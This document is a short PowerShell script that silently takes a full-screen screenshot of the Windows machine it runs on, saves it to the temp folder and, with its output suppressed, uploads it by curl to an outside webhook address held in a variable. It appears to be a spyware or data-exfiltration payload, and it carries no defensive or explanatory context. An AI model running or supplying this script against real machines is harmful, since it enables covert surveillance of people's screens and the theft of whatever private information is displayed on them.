
$hookurl = $hookurl
$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen1 = Get-CimInstance Win32_VideoController
$Screen2 = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = [int]($Screen1).CurrentHorizontalResolution
$Height = [int]($Screen1).CurrentVerticalResolution

$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
curl.exe  -s -o nul -F "file1=@$Filett" $hookurl | Out-Null

